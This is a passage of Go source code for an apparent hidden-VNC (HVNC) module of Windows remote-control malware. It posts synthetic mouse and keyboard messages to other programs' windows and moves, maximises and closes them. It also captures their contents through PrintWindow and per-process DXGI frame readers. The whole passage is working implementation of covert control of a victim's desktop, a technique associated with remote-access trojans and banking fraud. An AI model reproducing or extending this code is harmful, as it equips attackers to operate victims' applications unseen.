		hitTest := safeNCHitTest(hitHwnd, lparam)

		if hitTest != HTCLIENT && hitTest != 0 {
			if hitTest == HTCLOSE && !down {
				procPostMessageW.Call(hitHwnd, WM_CLOSE, 0, 0)
				procPostMessageW.Call(hitHwnd, WM_DESTROY, 0, 0)
				return nil
			}

			if hitTest == HTCAPTION {
				if down {
					var r rect
					if ok, _, _ := procGetWindowRect.Call(hitHwnd, uintptr(unsafe.Pointer(&r))); ok != 0 {
						hvncInputMu.Lock()
						hvncMovingWindow = true
						hvncWindowToMove = hitHwnd
						hvncMoveOffset = point{x: pt.x - r.left, y: pt.y - r.top}
						hvncWindowSize = point{x: r.right - r.left, y: r.bottom - r.top}
						hvncInputMu.Unlock()
					}
				}
				return nil
			}

			if hitTest == HTMAXBUTTON && !down {
				if isWindowMaximized(hitHwnd) {
					procPostMessageW.Call(hitHwnd, WM_SYSCOMMAND, SC_RESTORE, 0)
				} else {
					procPostMessageW.Call(hitHwnd, WM_SYSCOMMAND, SC_MAXIMIZE, 0)
				}
				return nil
			}

			if hitTest == HTMINBUTTON && !down {
				procPostMessageW.Call(hitHwnd, WM_SYSCOMMAND, SC_MINIMIZE, 0)
				return nil
			}
		}
	}

	clientPt := pt
	procScreenToClient.Call(hitHwnd, uintptr(unsafe.Pointer(&clientPt)))

	var msg uint32
	var wparam uintptr
	switch button {
	case 0:
		if down {
			msg = WM_LBUTTONDOWN
			wparam = MK_LBUTTON
		} else {
			msg = WM_LBUTTONUP
			wparam = 0
		}
	case 1:
		if down {
			msg = WM_MBUTTONDOWN
			wparam = MK_MBUTTON
		} else {
			msg = WM_MBUTTONUP
			wparam = 0
		}
	case 2:
		if down {
			msg = WM_RBUTTONDOWN
			wparam = MK_RBUTTON
		} else {
			msg = WM_RBUTTONUP
			wparam = 0
		}
	default:
		return nil
	}

	postMouseMessage(hitHwnd, msg, wparam, clientPt)
	return nil
}

func hvncKeyOnThread(vk uint16, down bool) error {
	pt := currentHVNCCursor()
	hwnd := windowFromPoint(pt)
	if hwnd == 0 {
		hwnd = foregroundWindow()
	}
	if hwnd == 0 {
		hwnd = getWorkingWindow()
	}
	if hwnd == 0 {
		hwnd = findAnyVisibleTopLevelWindow()
	}
	if hwnd == 0 {
		return nil
	}
	root := rootWindow(hwnd)
	prevWorking := getWorkingWindow()
	rememberWorkingWindow(root)
	prevRoot := rootWindow(prevWorking)
	if prevWorking == 0 || (prevRoot != root && !sameProcessWindows(prevRoot, root)) {
		procSetForegroundWindow.Call(root)
		procSetActiveWindow.Call(root)
		procSetFocus.Call(hwnd)
	}
	updateModifierState(vk, down)

	if isModifierVK(vk) {
		return nil
	}

	if down {
		if ch := virtualKeyToChars(vk); len(ch) > 0 && !isNonPrintableVK(vk) {
			for _, r := range ch {
				procPostMessageW.Call(hwnd, WM_CHAR, uintptr(r), uintptr(1))
			}
		} else {
			postKeyMessage(hwnd, WM_KEYDOWN, vk)
		}
	} else {
		postKeyMessage(hwnd, WM_KEYUP, vk)
	}
	return nil
}

func foregroundWindow() uintptr {
	r, _, _ := procGetForegroundWindow.Call()
	return r
}

func findAnyVisibleTopLevelWindow() uintptr {
	hwnd := getTopWindow(0)
	for hwnd != 0 {
		if isWindowVisible(hwnd) {
			return hwnd
		}
		hwnd = getWindow(hwnd, GW_HWNDNEXT)
	}
	return 0
}

func makeLParam(x, y int32) uintptr {
	return uintptr((uint32(y) << 16) | (uint32(x) & 0xFFFF))
}

func windowFromPoint(pt point) uintptr {
	ret, _, _ := procWindowFromPoint.Call(uintptr(*(*int64)(unsafe.Pointer(&pt))))
	return ret
}

func rootWindow(hwnd uintptr) uintptr {
	if hwnd == 0 {
		return 0
	}
	r, _, _ := procGetAncestor.Call(hwnd, GA_ROOT)
	if r == 0 {
		return hwnd
	}
	return r
}

func windowPID(hwnd uintptr) uint32 {
	var pid uint32
	procGetWindowThreadProcessId.Call(hwnd, uintptr(unsafe.Pointer(&pid)))
	return pid
}

func sameProcessWindows(a, b uintptr) bool {
	if a == 0 || b == 0 {
		return false
	}
	return windowPID(a) == windowPID(b)
}

func setWorkingWindow(hwnd uintptr) {
	if hwnd == 0 {
		return
	}
	rememberWorkingWindow(hwnd)
	procSetForegroundWindow.Call(hwnd)
	procSetActiveWindow.Call(hwnd)
	procSetFocus.Call(hwnd)
}

func rememberWorkingWindow(hwnd uintptr) {
	if hwnd == 0 {
		return
	}
	hvncInputMu.Lock()
	hvncWorkingWindow = hwnd
	hvncInputMu.Unlock()
}

func getWorkingWindow() uintptr {
	hvncInputMu.Lock()
	defer hvncInputMu.Unlock()
	return hvncWorkingWindow
}

func currentHVNCCursor() point {
	hvncInputMu.Lock()
	if hvncHasCursor {
		pt := hvncLastCursor
		hvncInputMu.Unlock()
		return pt
	}
	hvncInputMu.Unlock()
	var pt point
	procGetCursorPosHVNC.Call(uintptr(unsafe.Pointer(&pt)))
	return pt
}

func postMouseMessage(hwnd uintptr, msg uint32, wparam uintptr, pt point) {
	procPostMessageW.Call(hwnd, uintptr(msg), wparam, makeLParam(pt.x, pt.y))
}

func setPendingActivation(hwnd uintptr) {
	hvncInputMu.Lock()
	hvncPendingActivate = hwnd
	hvncInputMu.Unlock()
}

func consumePendingActivation() uintptr {
	hvncInputMu.Lock()
	defer hvncInputMu.Unlock()
	hwnd := hvncPendingActivate
	hvncPendingActivate = 0
	return hwnd
}

func postKeyMessage(hwnd uintptr, msg uint32, vk uint16) {
	scan := mapVirtualKey(uint32(vk))
	lparam := uintptr(1 | (scan << 16))
	if msg == WM_KEYUP {
		lparam |= 1 << 30
		lparam |= 1 << 31
	}
	procPostMessageW.Call(hwnd, uintptr(msg), uintptr(vk), lparam)
}

func setMouseButton(button int, down bool) uint32 {
	hvncInputMu.Lock()
	defer hvncInputMu.Unlock()
	var mask uint32
	switch button {
	case 0:
		mask = MK_LBUTTON
	case 1:
		mask = MK_MBUTTON
	case 2:
		mask = MK_RBUTTON
	default:
		return hvncMouseButtons
	}
	if down {
		hvncMouseButtons |= mask
	} else {
		hvncMouseButtons &^= mask
	}
	return hvncMouseButtons
}

func currentMouseButtons() uint32 {
	hvncInputMu.Lock()
	defer hvncInputMu.Unlock()
	return hvncMouseButtons
}

func mapVirtualKey(vk uint32) uintptr {
	r, _, _ := procMapVirtualKeyW.Call(uintptr(vk), 0)
	return r
}

func virtualKeyToChars(vk uint16) []rune {
	buf := make([]uint16, 8)
	state := buildKeyboardState()
	ret, _, _ := procToUnicode.Call(
		uintptr(vk),
		mapVirtualKey(uint32(vk)),
		uintptr(unsafe.Pointer(&state[0])),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(len(buf)),
		0,
	)
	if ret == 0 {
		return nil
	}
	if ret < 0 {
		ret = -ret
	}
	return []rune(syscall.UTF16ToString(buf[:ret]))
}

func isWindowMaximized(hwnd uintptr) bool {
	type windowPlacement struct {
		length         uint32
		flags          uint32
		showCmd        uint32
		ptMinPositionX int32
		ptMinPositionY int32
		ptMaxPositionX int32
		ptMaxPositionY int32
		rcNormalLeft   int32
		rcNormalTop    int32
		rcNormalRight  int32
		rcNormalBottom int32
	}
	var wp windowPlacement
	wp.length = uint32(unsafe.Sizeof(wp))
	procGetWindowPlacement.Call(hwnd, uintptr(unsafe.Pointer(&wp)))
	return wp.showCmd == SW_SHOWMAXIMIZED
}

func safeNCHitTest(hwnd uintptr, lparam uintptr) int32 {
	const timeoutMs = 75
	var result uintptr
	r, _, _ := procSendMessageTimeoutW.Call(
		hwnd,
		WM_NCHITTEST,
		0,
		lparam,
		SMTO_ABORTIFHUNG,
		timeoutMs,
		uintptr(unsafe.Pointer(&result)),
	)
	if r == 0 {
		return 0
	}
	return int32(result)
}

func moveHVNCWindowIfDragging(screenPt point) {
	hvncInputMu.Lock()
	moving := hvncMovingWindow
	hwnd := hvncWindowToMove
	offset := hvncMoveOffset
	size := hvncWindowSize
	hvncInputMu.Unlock()
	if !moving || hwnd == 0 {
		return
	}
	newX := int32(screenPt.x) - offset.x
	newY := int32(screenPt.y) - offset.y
	procSetWindowPos.Call(hwnd, 0, uintptr(newX), uintptr(newY), uintptr(size.x), uintptr(size.y), 0)
}

func endHVNCWindowDrag(screenPt point) {
	hvncInputMu.Lock()
	moving := hvncMovingWindow
	hwnd := hvncWindowToMove
	offset := hvncMoveOffset
	size := hvncWindowSize
	hvncMovingWindow = false
	hvncWindowToMove = 0
	hvncInputMu.Unlock()
	if !moving || hwnd == 0 {
		return
	}
	newX := int32(screenPt.x) - offset.x
	newY := int32(screenPt.y) - offset.y
	procSetWindowPos.Call(hwnd, 0, uintptr(newX), uintptr(newY), uintptr(size.x), uintptr(size.y), 0)
}

func hvncMouseWheelOnThread(delta int32) error {
	pt := currentHVNCCursor()
	hwnd := windowFromPoint(pt)
	if hwnd == 0 {
		hwnd = getWorkingWindow()
		if hwnd == 0 {
			return nil
		}
	}
	wparam := (uintptr(uint16(delta)) << 16) | uintptr(currentMouseButtons())
	procPostMessageW.Call(hwnd, WM_MOUSEWHEEL, wparam, makeLParam(pt.x, pt.y))
	return nil
}

func isNonPrintableVK(vk uint16) bool {
	if vk >= 0x70 && vk <= 0x7B { // F1-F12
		return true
	}
	switch vk {
	case 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28: // PageUp/Down, End, Home, Arrows
		return true
	case 0x2D, 0x2E: // Insert, Delete
		return true
	case 0x5B, 0x5C, 0x5D: // Win, Win, Apps
		return true
	case 0x91, 0x90: // Scroll, NumLock
		return true
	case 0x0D, 0x1B, 0x09, 0x08: // Enter, Escape, Tab, Backspace
		return true
	case 0x10, 0xA0, 0xA1, 0x11, 0xA2, 0xA3, 0x12, 0xA4, 0xA5, 0x14:
		return true
	default:
		return false
	}
}

func isModifierVK(vk uint16) bool {
	switch vk {
	case VK_SHIFT, VK_LSHIFT, VK_RSHIFT, VK_CONTROL, VK_LCONTROL, VK_RCONTROL, VK_MENU, VK_LMENU, VK_RMENU, VK_CAPITAL:
		return true
	default:
		return false
	}
}

func updateModifierState(vk uint16, down bool) {
	hvncInputMu.Lock()
	defer hvncInputMu.Unlock()
	switch vk {
	case VK_SHIFT, VK_LSHIFT, VK_RSHIFT:
		hvncShiftDown = down
	case VK_CONTROL, VK_LCONTROL, VK_RCONTROL:
		hvncCtrlDown = down
	case VK_MENU, VK_LMENU, VK_RMENU:
		hvncAltDown = down
	case VK_CAPITAL:
		if down {
			hvncCapsLock = !hvncCapsLock
		}
	}
}

func buildKeyboardState() []byte {
	state := make([]byte, 256)
	hvncInputMu.Lock()
	shift := hvncShiftDown
	ctrl := hvncCtrlDown
	alt := hvncAltDown
	caps := hvncCapsLock
	hvncInputMu.Unlock()
	if shift {
		state[VK_SHIFT] = 0x80
	}
	if ctrl {
		state[VK_CONTROL] = 0x80
	}
	if alt {
		state[VK_MENU] = 0x80
	}
	if caps {
		state[VK_CAPITAL] = 0x01
	}
	return state
}

func HVNCMonitorCount() int {
	return displayCount()
}

func hvncResolveCaptureBounds(display int) (image.Rectangle, string) {
	mons := monitorList()
	if display >= 0 && display < len(mons) {
		mon := mons[display]
		bounds := captureBounds(mon)
		if bounds.Dx() > 0 && bounds.Dy() > 0 {
			return bounds, fmt.Sprintf("monitor=%d name=%q", display, mon.name)
		}
	}
	if desktopBounds, ok := hvncDesktopBounds(); ok {
		return desktopBounds, "desktop"
	}
	vx := int(getSystemMetric(SM_XVIRTUALSCREEN))
	vy := int(getSystemMetric(SM_YVIRTUALSCREEN))
	vw := int(getSystemMetric(SM_CXVIRTUALSCREEN))
	vh := int(getSystemMetric(SM_CYVIRTUALSCREEN))
	if vw > 0 && vh > 0 {
		return image.Rect(vx, vy, vx+vw, vy+vh), "virtual"
	}
	return image.Rectangle{}, "unknown"
}

func drawHVNCWindowsToBuffer(hdcScreen uintptr, bounds image.Rectangle, target []byte, targetStride int) int {
	hwnd := getTopWindow(0)
	if hwnd == 0 {
		return 0
	}
	hwnd = getWindow(hwnd, GW_HWNDLAST)
	if hwnd == 0 {
		return 0
	}

	// Initialize cache if needed
	if hvncWinCache == nil {
		hvncWinCache = make(map[uintptr]*hvncWinCacheEntry)
	}

	// Track which windows are still alive this frame
	alive := make(map[uintptr]bool)

	drawn := 0
	for hwnd != 0 {
		if drawHVNCWindow(hdcScreen, hwnd, bounds, target, targetStride) {
			drawn++
		}
		alive[hwnd] = true
		hwnd = getWindow(hwnd, GW_HWNDPREV)
	}

	// Evict cache entries for windows that no longer exist
	for h, entry := range hvncWinCache {
		if !alive[h] {
			hvncFreeCacheEntry(entry)
			delete(hvncWinCache, h)
		}
	}

	return drawn
}

func hvncGetOrCreateCache(hdcScreen uintptr, hwnd uintptr, w, h int) *hvncWinCacheEntry {
	entry, ok := hvncWinCache[hwnd]
	if ok && entry.w == w && entry.h == h && entry.hdcMem != 0 && entry.hbmp != 0 {
		entry.age = 0
		return entry
	}
	if ok {
		hvncFreeCacheEntry(entry)
	}
	hdcMem := createCompatibleDC(hdcScreen)
	if hdcMem == 0 {
		return nil
	}
	bmi := bitmapInfo{
		bmiHeader: bitmapInfoHeader{
			biSize:        uint32(unsafe.Sizeof(bitmapInfoHeader{})),
			biWidth:       int32(w),
			biHeight:      -int32(h),
			biPlanes:      1,
			biBitCount:    32,
			biCompression: BI_RGB,
		},
	}
	var bits unsafe.Pointer
	hbmp := createDIBSection(hdcMem, &bmi, DIB_RGB_COLORS, &bits)
	if hbmp == 0 || bits == nil {
		deleteDC(hdcMem)
		return nil
	}
	selectObject(hdcMem, hbmp)

	entry = &hvncWinCacheEntry{
		hdcMem: hdcMem,
		hbmp:   hbmp,
		bits:   bits,
		w:      w,
		h:      h,
	}
	hvncWinCache[hwnd] = entry
	return entry
}

func hvncFreeCacheEntry(entry *hvncWinCacheEntry) {
	if entry.hbmp != 0 {
		deleteObject(entry.hbmp)
	}
	if entry.hdcMem != 0 {
		deleteDC(entry.hdcMem)
	}
}

var dxgiFrameBuf []byte

var hvncDXGIEnabled atomic.Bool

func init() {
	hvncDXGIEnabled.Store(true) // enabled by default
}

func SetHVNCDXGIEnabled(enabled bool) {
	hvncDXGIEnabled.Store(enabled)
}

func GetHVNCDXGIEnabled() bool {
	return hvncDXGIEnabled.Load()
}

func drawHVNCWindowFromDXGI(hwnd uintptr, winLeft, winTop, winW, winH int, bounds image.Rectangle, target []byte, targetStride int) bool {
	if !hvncDXGIEnabled.Load() {
		return false
	}
	var pid uint32
	procGetWindowThreadProcessId.Call(hwnd, uintptr(unsafe.Pointer(&pid)))
	if pid == 0 {
		return false
	}

	reader := hvncGetFrameReader(pid)
	if reader == nil {
		hvncFrameReadersMu.Lock()
		gpuPID := hvncGPUPIDMap[pid]
		hvncFrameReadersMu.Unlock()
		if gpuPID != 0 {
			reader = hvncGetFrameReader(gpuPID)
		}
	}
	if reader == nil {
		return false
	}

	needed := winW * winH * 4
	if cap(dxgiFrameBuf) < needed {
		dxgiFrameBuf = make([]byte, needed)
	}
	buf := dxgiFrameBuf[:needed]

	frameW, frameH, ok := reader.readFrame(buf)
	if !ok {
		return false
	}

	copyW := minInt(winW, frameW)
	copyH := minInt(winH, frameH)
	if copyW <= 0 || copyH <= 0 {
		return false
	}

	srcStride := frameW * 4
	winStride := winW * 4

	effWinLeft := winLeft
	effWinTop := winTop
	effWinRight := winLeft + copyW
	effWinBottom := winTop + copyH

	interLeft := maxInt(effWinLeft, bounds.Min.X)
	interTop := maxInt(effWinTop, bounds.Min.Y)
	interRight := minInt(effWinRight, bounds.Max.X)
	interBottom := minInt(effWinBottom, bounds.Max.Y)
	if interRight <= interLeft || interBottom <= interTop {
		return false
	}

	srcX := interLeft - winLeft
	srcY := interTop - winTop
	dstX := interLeft - bounds.Min.X
	dstY := interTop - bounds.Min.Y
	blitW := interRight - interLeft
	blitH := interBottom - interTop

	for y := 0; y < blitH; y++ {
		srcStart := (srcY+y)*srcStride + srcX*4
		dstStart := (dstY+y)*targetStride + dstX*4
		copy(target[dstStart:dstStart+blitW*4], buf[srcStart:srcStart+blitW*4])
	}

	_ = winStride
	return true
}

func drawHVNCWindow(hdcScreen, hwnd uintptr, bounds image.Rectangle, target []byte, targetStride int) bool {
	if !isWindowVisible(hwnd) {
		return false
	}
	var r rect
	ok, _, _ := procGetWindowRect.Call(hwnd, uintptr(unsafe.Pointer(&r)))
	if ok == 0 {
		return false
	}
	winLeft := int(r.left)
	winTop := int(r.top)
	winRight := int(r.right)
	winBottom := int(r.bottom)
	if winRight <= winLeft || winBottom <= winTop {
		return false
	}
	if winRight <= bounds.Min.X || winLeft >= bounds.Max.X || winBottom <= bounds.Min.Y || winTop >= bounds.Max.Y {
		return false
	}

	winW := winRight - winLeft
	winH := winBottom - winTop
	if winW <= 0 || winH <= 0 {
		return false
	}

	if drawn := drawHVNCWindowFromDXGI(hwnd, winLeft, winTop, winW, winH, bounds, target, targetStride); drawn {
		return true
	}

	// Use pooled DC+DIB from cache
	entry := hvncGetOrCreateCache(hdcScreen, hwnd, winW, winH)
	if entry == nil {
		return false
	}

	if !printWindow(hwnd, entry.hdcMem, PW_RENDERFULLCONTENT) {
		entry.lastOK = false
		entry.age++
		return false
	}
	entry.lastOK = true

	buf := unsafe.Slice((*byte)(entry.bits), winW*winH*4)
	winStride := winW * 4

	effTop, effLeft, effBottom, effRight := 0, 0, winH, winW

	topFound := false
	for y := 0; y < winH; y++ {
		rowBase := y * winStride
		for x := 0; x < winW; x++ {
			off := rowBase + x*4
			if buf[off]|buf[off+1]|buf[off+2] != 0 {
				effTop = y
				topFound = true
				break
			}
		}
		if topFound {
			break
		}
	}
	if !topFound {
		return false
	}

	for y := winH - 1; y > effTop; y-- {
		rowBase := y * winStride
		found := false
		for x := 0; x < winW; x++ {
			off := rowBase + x*4
			if buf[off]|buf[off+1]|buf[off+2] != 0 {
				found = true
				break
			}
		}
		if found {
			effBottom = y + 1
			break
		}
	}

	leftFound := false
	for x := 0; x < winW; x++ {
		for y := effTop; y < effBottom; y++ {
			off := y*winStride + x*4
			if buf[off]|buf[off+1]|buf[off+2] != 0 {
				effLeft = x
				leftFound = true
				break
			}
		}
		if leftFound {
			break
		}
	}

	for x := winW - 1; x > effLeft; x-- {
		found := false
		for y := effTop; y < effBottom; y++ {
			off := y*winStride + x*4
			if buf[off]|buf[off+1]|buf[off+2] != 0 {
				found = true
				break
			}
		}
		if found {
			effRight = x + 1
			break
		}
	}

	effWinLeft := winLeft + effLeft
	effWinTop := winTop + effTop
	effWinRight := winLeft + effRight
	effWinBottom := winTop + effBottom

	interLeft := maxInt(effWinLeft, bounds.Min.X)
	interTop := maxInt(effWinTop, bounds.Min.Y)
	interRight := minInt(effWinRight, bounds.Max.X)
	interBottom := minInt(effWinBottom, bounds.Max.Y)
	if interRight <= interLeft || interBottom <= interTop {
		return false
	}

	srcX := interLeft - winLeft
	srcY := interTop - winTop
	dstX := interLeft - bounds.Min.X
	dstY := interTop - bounds.Min.Y
	copyW := interRight - interLeft
	copyH := interBottom - interTop

	for y := 0; y < copyH; y++ {
		srcStart := (srcY+y)*winStride + srcX*4
		dstStart := (dstY+y)*targetStride + dstX*4
		copy(target[dstStart:dstStart+copyW*4], buf[srcStart:srcStart+copyW*4])
	}

	return true
}

func maxInt(a, b int) int {
	if a > b {
		return a
	}
	return b
}

func minInt(a, b int) int {
	if a < b {
		return a
	}
	return b
}
